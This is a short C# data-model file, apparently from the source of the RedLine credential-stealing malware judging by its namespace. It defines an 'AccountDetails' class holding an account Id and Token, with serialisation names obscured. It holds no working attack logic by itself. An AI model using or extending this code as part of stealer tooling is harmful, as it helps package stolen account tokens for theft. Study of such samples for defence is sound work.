using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[ProtoContract(Name = "AccountDetails")]
[DataContract(Name = "Acc", Namespace = "Entity")]
public class AccountDetails
{
	[DataMember(Name = "TreeObject2")]
	[ProtoMember(1, Name = "Id")]
	public string Id { get; set; }

	[ProtoMember(2, Name = "Token")]
	[DataMember(Name = "TreeObject3")]
	public string Token { get; set; }
}
